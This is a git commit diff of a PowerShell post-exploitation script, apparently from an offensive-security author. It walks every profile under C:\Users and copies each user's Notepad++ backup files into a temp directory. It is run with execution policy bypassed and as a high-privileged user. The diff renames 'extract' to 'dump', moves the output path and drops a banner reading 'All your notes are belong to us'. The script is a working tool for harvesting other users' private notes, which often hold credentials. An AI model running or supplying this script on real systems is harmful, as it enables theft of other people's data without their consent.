ad15ca7929c539c6e1c46898791b2498eedbf119
0xPThree <108757172+0xPThree@users.noreply.github.com>
2024-06-13 08:50:08 +0200

    Update notepad_extract.ps1

--- notepad_extract.ps1
+++ notepad_extract.ps1
@@ -1,34 +1,23 @@
 <#
 .DESCRIPTION
-    Loops through all users in C:\Users and extracts roaming Notepad++ files. 
+    Loops through all users in C:\Users and dumps roaming Notepad++ files. 
     Needless to say the script should to be run as a *high privileged user* to get as much information as possible.
 
 .EXAMPLE
-    PS C:\tmp> powershell.exe -executionpolicy bypass .\notepad_extract.ps1
-
-	[+] Extracting Notepad++ data from 'Legit-User' to: C:\tmp\Legit-User
-	[+] Extracting Notepad++ data from 'DjKhaled' to: C:\tmp\DjKhaled
-	[+] Extracting Notepad++ data from 'AnotherOne' to: C:\tmp\AnotherOne
-	[-] 'Public' doesn't have any roaming Notepad++ data.
+    PS E:\devop-scripts> powershell.exe -ExecutionPolicy Bypass .\notepad_dump.ps1
+    [-] 'Public' doesn't have any roaming Notepad++ data.
+    [+] Dumping Notepad++ data from 'void' to: C:\Users\void\AppData\Local\Temp\void\notepad++
+    [+] Dumping Notepad++ data from 'testuser' to: C:\Users\void\AppData\Local\Temp\testuser\notepad++
 
 .NOTES
     Author: 0xPThree @ Exploit.se
-    Date: 2024-05-16
-    Version: 1.0
+    Date: 2024-06-13
+    Version: 1.1
 #>
-
-$banner = @"
-      __  ___  ___  __        __       __              __  
-|\ | /  \  |  |__  |__)  /\  |  \     |  \ |  |  |\/| |__) 
-| \| \__/  |  |___ |    /~~\ |__/ ___ |__/ \__/  |  | |    
-                                                           
-"All your notes are belong to us"
-"@
-Write-Host $banner
 
 try {
     $rootDirectory = "C:\Users"
-    $destinationRootDirectory = "C:\tmp"
+    $destinationRootDirectory = "$ENV:Temp\"
     $found = $false
 
     Get-ChildItem $rootDirectory -Directory -ErrorAction SilentlyContinue | ForEach-Object {
@@ -39,17 +28,16 @@ try {
             $backupItemCount = @(Get-ChildItem -Path $backupDirectory -Recurse -File).Count
             if ($backupItemCount -gt 0) {
                 $found = $true
-                $destinationDirectory = Join-Path -Path $destinationRootDirectory -ChildPath $username
+                $destinationDirectory = Join-Path -Path $destinationRootDirectory -ChildPath "$username\notepad++"
                 New-Item -ItemType Directory -Path $destinationDirectory -Force -ErrorAction SilentlyContinue | Out-Null
                 Copy-Item -Path "$backupDirectory\*" -Destination $destinationDirectory -Recurse -Force
-                Write-Host "[+] Extracting Notepad++ data from '$username' to: $destinationDirectory" -ForegroundColor DarkGreen
+		Write-Host -NoNewline "[+] " -ForegroundColor DarkGreen;  Write-Host -NoNewline "Dumping Notepad++ data from '$username' to: $destinationDirectory"; Write-Host ""
             } else {
-                Write-Host "[-] '$username' doesn't have any roaming Notepad++ data." -ForegroundColor DarkYellow
+                Write-Host -NoNewline "[-] " -ForegroundColor DarkYellow;  Write-Host -NoNewline "'$username' doesn't have any roaming Notepad++ data."; Write-Host ""
             }
         } else {
-            Write-Host "[-] '$username' doesn't have any roaming Notepad++ data." -ForegroundColor DarkYellow
+            Write-Host -NoNewline "[-] " -ForegroundColor DarkYellow;  Write-Host -NoNewline "'$username' doesn't have any roaming Notepad++ data."; Write-Host ""
         }
     }
-
-    if (-not $found) { Write-Host "[!] No backup directories found under $rootDirectory." -ForegroundColor DarkRed }
+    if (-not $found) { Write-Host -NoNewline "[!] " -ForegroundColor DarkRed;  Write-Host -NoNewline "No backup directories found under $rootDirectory."; Write-Host "" }
 } catch { Write-Host "An error occurred: $_" -ForegroundColor DarkRed }
